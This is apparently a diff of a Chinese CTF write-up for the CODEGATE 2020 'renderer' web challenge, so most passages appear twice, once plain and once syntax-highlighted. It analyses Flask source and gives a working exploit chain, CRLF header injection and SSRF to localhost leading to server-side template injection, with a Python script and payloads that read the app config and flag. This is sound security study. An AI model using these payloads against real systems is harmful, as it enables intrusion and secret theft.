-<p>虽然这里的路由 <code>/whatismyip</code> 可以被 <code>X-Forwarded-For</code> 影响，但实际测试中发现无法触发 ssti 漏洞，因此需要继续审计代码获得漏洞点：</p>
-
-<pre><code class="language-python">@front.route(&quot;/admin/ticket&quot;, methods=[&quot;GET&quot;])
-def admin_ticket():
-    ip = get_ip()
-    rip = get_real_ip()
-
-    if ip != rip: #proxy doesn't allow to show ticket
-        print 1
-        abort(403)
-    if ip not in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]: #only local
-        print 2
-        abort(403)
-    if request.headers.get(&quot;User-Agent&quot;) != &quot;AdminBrowser/1.337&quot;:
-        print request.headers.get(&quot;User-Agent&quot;)
-        abort(403)
+    <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">!=</span> rip: <span style="color:#75715e">#proxy doesn&#39;t allow to show ticket</span>
+        <span style="color:#66d9ef">print</span> <span style="color:#ae81ff">1</span>
+        abort(<span style="color:#ae81ff">403</span>)
+    <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;127.0.0.2&#34;</span>]: <span style="color:#75715e">#only local</span>
+        <span style="color:#66d9ef">print</span> <span style="color:#ae81ff">2</span>
+        abort(<span style="color:#ae81ff">403</span>)
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;User-Agent&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;AdminBrowser/1.337&#34;</span>:
+        <span style="color:#66d9ef">print</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;User-Agent&#34;</span>)
+        abort(<span style="color:#ae81ff">403</span>)
     
-    if request.args.get(&quot;ticket&quot;):
-        log = read_log(request.args.get(&quot;ticket&quot;))
-        if not log:
-            print 4
-            abort(403)
-        return render_template_string(log)
-</code></pre>
-
-<p>这里我们注意到 <code>render_template_string(log)</code>，变量 <code>log</code> 会被渲染，因此这里很可能存在一个 ssti 漏洞。而如何控制 <code>log</code> 变量？可以看到 <code>log</code> 变量来自 <code>read_log</code> 函数：</p>
-
-<pre><code class="language-python">def read_log(ticket):
-    if not (ticket and ticket.isalnum()):
-        return False
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;ticket&#34;</span>):
+        log <span style="color:#f92672">=</span> read_log(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;ticket&#34;</span>))
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> log:
+            <span style="color:#66d9ef">print</span> <span style="color:#ae81ff">4</span>
+            abort(<span style="color:#ae81ff">403</span>)
+        <span style="color:#66d9ef">return</span> render_template_string(log)
+</code></pre></div><p>这里我们注意到 <code>render_template_string(log)</code>，变量 <code>log</code> 会被渲染，因此这里很可能存在一个 ssti 漏洞。而如何控制 <code>log</code> 变量？可以看到 <code>log</code> 变量来自 <code>read_log</code> 函数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_log</span>(ticket):
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (ticket <span style="color:#f92672">and</span> ticket<span style="color:#f92672">.</span>isalnum()):
+        <span style="color:#66d9ef">return</span> False
     
-    if path.exists(&quot;/home/tickets/%s&quot; % ticket):
-        with open(&quot;/home/tickets/%s&quot; % ticket, &quot;r&quot;) as f:
-            return f.read()
-    else:
-        return False
-</code></pre>
+    <span style="color:#66d9ef">if</span> path<span style="color:#f92672">.</span>exists(<span style="color:#e6db74">&#34;/home/tickets/</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> ticket):
+        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/home/tickets/</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> ticket, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+            <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span>read()
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> False
+</code></pre></div><p>而哪里可以写这个文件呢，继续往下看，注意到函数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@front.route</span>(<span style="color:#e6db74">&#34;/admin&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin_access</span>():
+    ip <span style="color:#f92672">=</span> get_ip()
+    rip <span style="color:#f92672">=</span> get_real_ip()
 
-<p>而哪里可以写这个文件呢，继续往下看，注意到函数：</p>
+    <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;127.0.0.2&#34;</span>]: <span style="color:#75715e">#super private ip :)</span>
+        abort(<span style="color:#ae81ff">403</span>)
 
-<pre><code class="language-python">@front.route(&quot;/admin&quot;, methods=[&quot;GET&quot;])
-def admin_access():
-    ip = get_ip()
-    rip = get_real_ip()
+    <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">!=</span> rip: <span style="color:#75715e">#if use proxy</span>
+        ticket <span style="color:#f92672">=</span> write_log(rip)
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;admin_remote.html&#34;</span>, ticket <span style="color:#f92672">=</span> ticket)
 
-    if ip not in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]: #super private ip :)
-        abort(403)
-
-    if ip != rip: #if use proxy
-        ticket = write_log(rip)
-        return render_template(&quot;admin_remote.html&quot;, ticket = ticket)
-
-    else:
-        if ip == &quot;127.0.0.2&quot; and request.args.get(&quot;body&quot;):
-            ticket = write_extend_log(rip, request.args.get(&quot;body&quot;))
-            return render_template(&quot;admin_local.html&quot;, ticket = ticket)
-        else:
-            return render_template(&quot;admin_local.html&quot;, ticket = None)
-</code></pre>
-
-<p>当 <code>ip != rip</code> 时存在一次写入机会，可以调用 <code>write_log</code> 并返回相应的 <code>tid</code>:</p>
-
-<pre><code class="language-python">def write_log(rip):
-    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
-    with open(&quot;/home/tickets/%s&quot; % tid, &quot;w&quot;) as f:
-        log_str = &quot;Admin page accessed from %s&quot; % rip
-        f.write(log_str)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">if</span> ip <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;127.0.0.2&#34;</span> <span style="color:#f92672">and</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;body&#34;</span>):
+            ticket <span style="color:#f92672">=</span> write_extend_log(rip, request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;body&#34;</span>))
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;admin_local.html&#34;</span>, ticket <span style="color:#f92672">=</span> ticket)
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;admin_local.html&#34;</span>, ticket <span style="color:#f92672">=</span> None)
+</code></pre></div><p>当 <code>ip != rip</code> 时存在一次写入机会，可以调用 <code>write_log</code> 并返回相应的 <code>tid</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_log</span>(rip):
+    tid <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha1(str(time<span style="color:#f92672">.</span>time()) <span style="color:#f92672">+</span> rip)<span style="color:#f92672">.</span>hexdigest()
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/home/tickets/</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> tid, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
+        log_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Admin page accessed from </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> rip
+        f<span style="color:#f92672">.</span>write(log_str)
     
-    return tid
-</code></pre>
-
-<p>由于进入该函数的条件是 <code>ip in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]</code>，所以我们必须使用 SSRF 来访问该路由，同时，在 SSRF 访问该路由的前提下，仍然需要保持 <code>ip != rip</code>，因此需要利用 CRLF 注入漏洞来写入 header <code>X-Forwarded-For</code>。</p>
-
+    <span style="color:#66d9ef">return</span> tid
+</code></pre></div><p>由于进入该函数的条件是 <code>ip in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]</code>，所以我们必须使用 SSRF 来访问该路由，同时，在 SSRF 访问该路由的前提下，仍然需要保持 <code>ip != rip</code>，因此需要利用 CRLF 注入漏洞来写入 header <code>X-Forwarded-For</code>。</p>
 <p>然后回顾 <code>/admin/ticket</code> 路由的条件，同样是  <code>ip in [&quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;]</code>，因此需要继续 SSRF，其次是 <code>request.headers.get(&quot;User-Agent&quot;) != &quot;AdminBrowser/1.337&quot;</code>，因此需要继续 CRLF 注入相应的请求头来覆盖默认的 urllib 请求头，为了构造的合理性，需要如下构造：</p>
-
 <pre><code>url = http://127.0.0.1/renderer/admin/ticket?ticket=c0105720c3cd521aadd35064b24db9699b2bc646 HTTP/1.1%Host: 127.0.0.1\r\nUser-Agent: AdminBrowser/1.337\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\nx
-</code></pre>
-
-<h3 id="思路总结">思路总结</h3>
-
+</code></pre><h3 id="思路总结">思路总结</h3>
 <ol>
 <li>利用 CRLF + SSRF 写入 log 文件，获得 ticket id（CRLF 注入 X-Forwarded-For）</li>
 <li>利用 CRLF + SSRF 访问 <code>/admin/ticket</code>  触发 ssti 漏洞 （CRLF 注入 User-Agent）</li>
 </ol>
-
 <h3 id="exp">exp</h3>
-
 <p>通过之前的源码，我们可以知道利用 ssti 访问 <code>config</code> 变量即可获得 flag：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 
-<pre><code class="language-python">import requests
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://58.229.253.144/renderer/&#39;</span>
 
-url = 'http://58.229.253.144/renderer/'
+payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;http://127.0.0.1/renderer/admin HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">X-Forwarded-For: {}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;http://127.0.0.1/renderer/admin/ticket?ticket={} HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: 127.0.0.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">User-Agent: AdminBrowser/1.337</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">X-Forwarded-For: 127.0.0.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">aaa&#39;&#39;&#39;</span>
 
-payload1 = '''http://127.0.0.1/renderer/admin HTTP/1.1\r\nX-Forwarded-For: {}\r\n'''
-payload2 = '''http://127.0.0.1/renderer/admin/ticket?ticket={} HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: AdminBrowser/1.337\r\nX-Forwarded-For: 127.0.0.1\r\naaa'''
-
-ssti_payload = '{{ config }}'
-data = {
-	'url': payload1.format(ssti_payload)
+ssti_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{ config }}&#39;</span>
+data <span style="color:#f92672">=</span> {
+	<span style="color:#e6db74">&#39;url&#39;</span>: payload1<span style="color:#f92672">.</span>format(ssti_payload)
 }
-r = requests.post(url=url, data=data)
+r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data)
 
-ticket = r.content[1652:1692]
-data = {
-	'url': payload2.format(ticket)
+ticket <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>content[<span style="color:#ae81ff">1652</span>:<span style="color:#ae81ff">1692</span>]
+data <span style="color:#f92672">=</span> {
+	<span style="color:#e6db74">&#39;url&#39;</span>: payload2<span style="color:#f92672">.</span>format(ticket)
 }
-r = requests.post(url=url, data=data)
-print(r.content)
-</code></pre>
-
-<p>最后成功获得 FLAG：<code>CODEGATE2020{CrLfMakesLocalGreatAgain}</code></p>
-
+r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url, data<span style="color:#f92672">=</span>data)
+<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>content)
+</code></pre></div><p>最后成功获得 FLAG：<code>CODEGATE2020{CrLfMakesLocalGreatAgain}</code></p>
 <h2 id="后记">后记</h2>
-
 <p>太菜了，基本就靠飘零师傅那边的思路来回顾题目了……</p>
-
 <h2 id="参考链接">参考链接</h2>
-
 <ul>
-<li><a href="http://www.yulegeyu.com/2018/07/15/CSP-unsafe-inline%E6%97%B6-%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8js/" rel="nofollow noreferrer" target="_blank">CSP unsafe-inline时, 引入外部js</a></li>
-<li><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" rel="nofollow noreferrer" target="_blank">三个案例看Nginx配置安全</a></li>
+<li><a href="http://www.yulegeyu.com/2018/07/15/CSP-unsafe-inline%E6%97%B6-%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8js/">CSP unsafe-inline时, 引入外部js</a></li>
+<li><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">三个案例看Nginx配置安全</a></li>
 </ul>
 
     </div>
